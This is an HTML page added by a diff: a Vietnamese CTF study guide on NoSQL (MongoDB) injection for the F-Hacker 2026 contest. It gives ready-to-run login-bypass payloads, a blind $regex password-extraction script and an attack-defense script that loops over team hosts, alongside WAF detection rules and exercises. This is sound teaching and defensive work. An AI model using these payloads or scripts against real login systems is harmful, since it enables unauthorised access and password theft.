@@ -1,0 +1,472 @@
+<title>NoSQL Injection — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Injection phía server</div>
+    <h1>NoSQL Injection</h1>
+    <p class="sub">Khi app dùng database NoSQL (phổ biến nhất là MongoDB) và nhận input dạng object/JSON thay vì
+    chuỗi, bạn có thể gửi <strong>toán tử query</strong> (<code>$ne</code>, <code>$gt</code>, <code>$regex</code>)
+    thay vì 1 giá trị thường — khiến điều kiện kiểm tra (vd so khớp mật khẩu) luôn đúng mà không cần biết giá trị
+    thật.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>NoSQL Injection là gì, để làm gì?</h2>
+  <p class="lead">MongoDB (và nhiều NoSQL khác) dùng cú pháp <strong>query bằng object</strong>, không phải chuỗi
+  SQL. Ví dụ kiểm tra đăng nhập: <code>db.users.findOne({username: "admin", password: "123456"})</code>. Nếu app
+  nhận input từ <strong>JSON body</strong> và đưa thẳng vào query mà không ép kiểu (chỉ nhận chuỗi thuần), bạn có
+  thể gửi <code>{"password": {"$ne": null}}</code> thay vì chuỗi mật khẩu — MongoDB hiểu <code>$ne</code> là
+  "không bằng" (not equal), và <strong>mọi</strong> mật khẩu thật đều "không bằng null" ⟹ điều kiện luôn đúng.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Khác SQLi (gửi chuỗi chứa ký tự đặc biệt phá cú pháp), NoSQLi thường gửi <strong>cấu trúc dữ liệu khác</strong>
+  (object thay vì chuỗi) — thử đổi <code>password=123</code> (form) thành
+  <code>password[$ne]=123</code> (PHP-style array syntax) hoặc gửi JSON body
+  <code>{"password": {"$ne": ""}}</code> tùy app nhận input kiểu nào.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ NOSQL INJECTION</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Form login/API nhận JSON body (Content-Type <code>application/json</code>), hoặc cookie/header gợi ý
+        Node.js/Express + MongoDB (<code>connect.sid</code>). Thử đổi password thành object
+        <code>{"$ne": ""}</code> thay vì chuỗi thường.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        App nhận input và đưa THẲNG vào query MongoDB mà không ép kiểu chuỗi (<code>String(input)</code>) trước.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Repeater: nếu request gốc là JSON <code>{"username":"x","password":"y"}</code>, sửa giá trị
+        <code>password</code> thành object <code>{"$ne": ""}</code> (xóa dấu ngoặc kép quanh giá trị để nó là
+        object JSON thật, không phải chuỗi).
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c">// 1. Bypass login (JSON body)</span>
+{"username": "admin", "password": {"$ne": ""}}
+
+<span class="c">// 2. Bypass login (query string / form, PHP-style array syntax)</span>
+username=admin&amp;password[$ne]=1
+
+<span class="c">// 3. Blind NoSQLi -- suy từng ký tự mật khẩu bằng $regex</span>
+{"username": "admin", "password": {"$regex": "^a"}}</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> requests
+r = requests.post(<span class="s">"http://TARGET/login"</span>, json={
+    <span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password"</span>: {<span class="s">"$ne"</span>: <span class="s">""</span>}
+})
+<span class="k">print</span>(r.text)   <span class="c"># mong đợi: đăng nhập thành công dù không biết mật khẩu</span></code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        App nhận form-urlencoded thay vì JSON → dùng cú pháp mảng <code>password[$ne]=1</code> (Express với
+        <code>body-parser</code> tự hiểu thành object). WAF rule nhanh: chặn regex
+        <code>\$(ne|gt|lt|regex|where)\b</code> trong body request. Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>NoSQL</b> — database không dùng bảng/hàng/cột theo kiểu SQL truyền thống, mà lưu dữ liệu
+  dạng document (giống JSON). MongoDB là NoSQL phổ biến nhất trong web.</div>
+  <div class="def"><b>Toán tử truy vấn MongoDB</b> — thay vì so sánh bằng (<code>=</code>), MongoDB cung cấp các
+  toán tử đặc biệt viết bằng key bắt đầu <code>$</code>: <code>$ne</code> (not equal), <code>$gt</code>/<code>$lt</code>
+  (lớn hơn/nhỏ hơn), <code>$regex</code> (khớp biểu thức chính quy), <code>$where</code> (chạy cả đoạn
+  JavaScript làm điều kiện).</div>
+  <p>Code hay viết (nhận object trực tiếp từ request, không ép kiểu):</p>
+  <pre><code><span class="c">// Node.js/Express + MongoDB</span>
+<span class="k">const</span> user = <span class="k">await</span> db.collection(<span class="s">'users'</span>).findOne({
+  username: req.body.username,
+  password: req.body.password   <span class="c">// !! nếu req.body.password là OBJECT thay vì string, Mongo hiểu như toán tử</span>
+});</code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>JSON cho phép gửi CẤU TRÚC, không chỉ giá trị đơn</h2>
+  <p>Khác với form HTML truyền thống (mọi giá trị đều là chuỗi), JSON cho phép bạn gửi <strong>bất kỳ kiểu dữ
+  liệu nào</strong> — chuỗi, số, object, mảng. Nếu server <strong>tin tưởng</strong> rằng trường
+  <code>password</code> luôn là chuỗi (vì giao diện form chỉ cho nhập text), nhưng thực chất nhận request trực
+  tiếp (qua API, không qua form), bạn hoàn toàn gửi được 1 <strong>object</strong> ở vị trí đáng lẽ là chuỗi.
+  MongoDB không hề biết "ý đồ" của lập trình viên là chỉ so sánh bằng — nó chỉ thấy object có key
+  <code>$ne</code> và thực thi đúng theo ngữ nghĩa toán tử đó.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Từ "so sánh bằng" thành "không bằng gì cũng được"</h2>
+  <div class="pbreak">
+    <div class="ph">db.users.findOne({ username: "admin", password: {"$ne": ""} })</div>
+    <div class="pb">
+      <div class="part"><code>username: "admin"</code> — vẫn là so sánh bằng chuỗi thường, tìm đúng user tên
+      admin.</div>
+      <div class="part"><code>password: {"$ne": ""}</code> — thay vì <code>password: "chuỗi_mật_khẩu_thật"</code>,
+      đây là toán tử: "tìm user có password <strong>KHÔNG BẰNG</strong> chuỗi rỗng".</div>
+      <div class="part">Vì mật khẩu thật của admin (bất kể giá trị gì, miễn không rỗng) luôn <strong>khác</strong>
+      chuỗi rỗng, điều kiện này LUÔN ĐÚNG với bất kỳ user nào có mật khẩu — tức là hầu như luôn tìm thấy user.</div>
+    </div>
+    <div class="resp"><b>Kết quả:</b> query trả về đúng record user admin, ứng dụng hiểu là "đăng nhập thành
+    công" dù bạn chưa từng biết mật khẩu thật.</div>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Request login có <code>Content-Type: application/json</code></td><td>Khả năng cao backend Node.js/Express, nhận object trực tiếp</td></tr>
+    <tr><td>Cookie <code>connect.sid</code></td><td>Express session — thường đi kèm MongoDB qua Mongoose</td></tr>
+    <tr><td>Gõ <code>'</code> không gây lỗi gì (loại trừ SQLi)</td><td>Không phải SQL, cân nhắc NoSQL</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Sửa kiểu dữ liệu trong Repeater</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request login JSON, Send to Repeater.</li>
+    <li>Sửa <code>"password": "anything"</code> thành <code>"password": {"$ne": ""}</code> — chú ý
+    <strong>xóa dấu ngoặc kép</strong> quanh giá trị để nó là object JSON thật, không phải chuỗi chứa ký tự
+    <code>$ne</code>.</li>
+    <li>Send, so sánh Response với request gốc (sai mật khẩu) — nếu giờ đăng nhập thành công ⟹ xác nhận.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Chọn đúng kỹ thuật theo tình huống</h2>
+
+  <h3>A. Bypass đăng nhập <span class="badge easy">thử trước</span></h3>
+  <table>
+    <tr><th>Payload (JSON)</th><th>Payload (query string/form)</th></tr>
+    <tr><td><code>{"password": {"$ne": ""}}</code></td><td><code>password[$ne]=1</code></td></tr>
+    <tr><td><code>{"password": {"$gt": ""}}</code></td><td><code>password[$gt]=</code></td></tr>
+    <tr><td><code>{"password": {"$regex": ".*"}}</code></td><td><code>password[$regex]=.*</code></td></tr>
+  </table>
+
+  <h3>B. Blind NoSQLi — suy từng ký tự (khi cần đọc dữ liệu, không chỉ bypass login)</h3>
+  <pre><code>{"username": {"$regex": "^a"}}   <span class="c">// true nếu CÓ user bắt đầu bằng "a"</span>
+{"username": {"$regex": "^admin$"}}, "password": {"$regex": "^p"}   <span class="c">// suy từng ký tự mật khẩu của admin</span></code></pre>
+  <div class="note tip"><span class="tag">Nguyên lý giống Boolean-blind SQLi</span>Thử từng ký tự ở từng vị trí,
+  xem response có khác biệt (đăng nhập thành công/App trả "user tồn tại") hay không — viết script lặp để tự động
+  hóa, xem mục 08.</div>
+
+  <h3>C. <code>$where</code> — chạy JavaScript tùy ý (nếu app cho phép, nguy hiểm nhất)</h3>
+  <pre><code>{"$where": "this.password.length > 0"}
+{"$where": "sleep(3000)"}   <span class="c">// time-based blind nếu không thấy khác biệt response</span></code></pre>
+  <div class="note warn"><span class="tag">Hiếm gặp hơn</span><code>$where</code> cho phép chạy cả đoạn code
+  JavaScript trong ngữ cảnh query — mạnh nhưng nhiều bản MongoDB mới đã hạn chế/tắt mặc định vì rủi ro quá lớn.</div>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: KHO PAYLOAD</div>
+  <h2>Không cần công cụ tự động riêng — chủ yếu cần đúng cú pháp</h2>
+  <p><code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/NoSQL Injection/</code> — payload mẫu cho cả MongoDB lẫn vài NoSQL
+  khác (CouchDB...). NoSQLi không có công cụ tự động phổ biến tương đương sqlmap — chủ yếu cần hiểu đúng cú pháp
+  object/toán tử, việc "dò" chủ yếu làm bằng tay hoặc script tự viết (mục 08).</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET/login"</span>
+
+<span class="c"># Bước 1: thử bypass trực tiếp</span>
+r = requests.post(url, json={<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password"</span>: {<span class="s">"$ne"</span>: <span class="s">""</span>}})
+<span class="k">print</span>(<span class="s">"Welcome"</span> <span class="k">in</span> r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — blind NoSQLi suy từng ký tự, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests, string
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+
+<span class="k">def</span> <span class="d">is_true</span>(url, cond):
+    r = requests.post(url, json={<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password"</span>: cond}, timeout=5)
+    <span class="k">return</span> <span class="s">"Welcome"</span> <span class="k">in</span> r.text
+
+<span class="k">def</span> <span class="d">extract_password</span>(url, max_len=40):
+    found = <span class="s">""</span>
+    charset = string.ascii_letters + string.digits
+    <span class="k">for</span> pos <span class="k">in</span> range(1, max_len + 1):
+        <span class="k">for</span> ch <span class="k">in</span> charset:
+            <span class="k">if</span> is_true(url, {<span class="s">"$regex"</span>: <span class="s">f"^{found}{ch}"</span>}):
+                found += ch
+                <span class="k">print</span>(found, end=<span class="s">"\r"</span>)
+                <span class="k">break</span>
+        <span class="k">else</span>:
+            <span class="k">break</span>
+    <span class="k">return</span> found
+
+<span class="k">print</span>(extract_password(<span class="s">"http://TARGET/login"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+
+<span class="k">def</span> <span class="d">exploit_nosqli</span>(host):
+    <span class="k">try</span>:
+        r = requests.post(<span class="s">f"http://{host}/login"</span>,
+                json={<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password"</span>: {<span class="s">"$ne"</span>: <span class="s">""</span>}}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_nosqli(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service Node.js/Express (cookie <code>connect.sid</code>), form login gửi JSON.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Thử NoSQLi</div><div class="d">Burp sửa <code>"password": "x"</code> thành <code>"password": {"$ne": ""}</code> → Response: "Welcome, admin!" ⟹ xác nhận bypass thành công.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Lấy flag</div><div class="d">Trang admin sau đăng nhập hiện <code>FHACKER2026{...}</code>.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex, soi body JSON)</th><th>Khớp gì</th></tr>
+    <tr><td><code>"\$(ne|gt|lt|gte|lte|regex|where|in|nin)"\s*:</code></td><td>Toán tử MongoDB phổ biến xuất hiện làm key trong JSON body</td></tr>
+    <tr><td><code>\[\$(ne|gt|regex)\]</code></td><td>Cú pháp mảng tương đương trong query string/form</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Tránh chặn nhầm</span>Nếu app hợp lệ có field tên trùng ngẫu nhiên
+  chứa chuỗi "$ne" ở đâu đó trong dữ liệu thường (hiếm nhưng có thể, vd trường bình luận), rule theo cú pháp
+  <code>"key": {"$...":</code> chính xác hơn so khớp chuỗi đơn giản.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Gửi object nhưng server báo lỗi 400/500</td><td>App có validate kiểu dữ liệu (chỉ chấp nhận string cho field password) trước khi query</td><td>Không khai thác được qua NoSQLi ở đây, kiểm tra field khác hoặc endpoint khác</td></tr>
+    <tr><td>Payload mảng <code>password[$ne]=1</code> không ăn dù app là Express</td><td>App không dùng <code>body-parser</code> extended mode, không tự parse cú pháp mảng từ query string</td><td>Chuyển hẳn sang gửi JSON body (Content-Type application/json) thay vì form-urlencoded</td></tr>
+    <tr><td>Response giống hệt nhau dù đổi payload (không boolean rõ ràng)</td><td>App không phản hồi khác biệt rõ cho true/false</td><td>Thử time-based qua <code>$where: "sleep(3000)"</code> nếu $where được phép, hoặc tìm điểm khác biệt nhỏ hơn (status code, độ dài response)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App dùng MongoDB (hoặc NoSQL tương tự), nhận input trực tiếp vào query mà không ép kiểu chuỗi.</td></tr>
+    <tr><td>❌</td><td>App ép kiểu rõ ràng trước khi query (<code>String(req.body.password)</code>) — object sẽ bị biến thành chuỗi <code>"[object Object]"</code>, mất hết ý nghĩa toán tử.</td></tr>
+    <tr><td>❌</td><td>Database là SQL (MySQL/PostgreSQL/SQLite) — bài này không áp dụng, xem bài SQLi.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, từ sửa JSON body tới khi bypass login
+  thành công.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ xóa dấu ngoặc kép quanh object — gửi
+  <code>"password": "{\"$ne\": \"\"}"</code> (vẫn là chuỗi) sẽ KHÔNG hoạt động, phải là
+  <code>"password": {"$ne": ""}</code> (object JSON thật).</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> app chặn được <code>$ne</code> theo blacklist tên toán tử. Tìm toán tử khác
+  đạt cùng hiệu quả bypass.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Thử <code>$gt</code> hoặc <code>$regex</code> — nhiều toán tử khác
+  nhau đều có thể tạo điều kiện "luôn đúng" tương tự <code>$ne</code>.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> app không bypass được login trực tiếp, nhưng có endpoint tìm kiếm user
+  theo username, phản hồi khác nhau giữa "tìm thấy"/"không tìm thấy". Viết chiến lược dùng NoSQLi blind để liệt
+  kê TOÀN BỘ username trong hệ thống.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Dùng <code>$regex</code> với tiền tố tăng dần
+  (<code>^a</code>, <code>^aa</code>, <code>^aan</code>...) để suy ra từng ký tự của MỌI username, không chỉ 1
+  user cụ thể.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>NoSQL</td><td>Database không theo mô hình bảng/SQL truyền thống, lưu dữ liệu dạng document (JSON-like).</td></tr>
+    <tr><td>Toán tử MongoDB (<code>$ne</code>, <code>$gt</code>...)</td><td>Cú pháp đặc biệt trong query MongoDB để so sánh theo điều kiện thay vì bằng tuyệt đối.</td></tr>
+    <tr><td><code>$where</code></td><td>Toán tử MongoDB cho phép chạy JavaScript tùy ý làm điều kiện query — mạnh nhưng rủi ro cao.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/NoSQL Injection/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("nosql-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("nosql-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
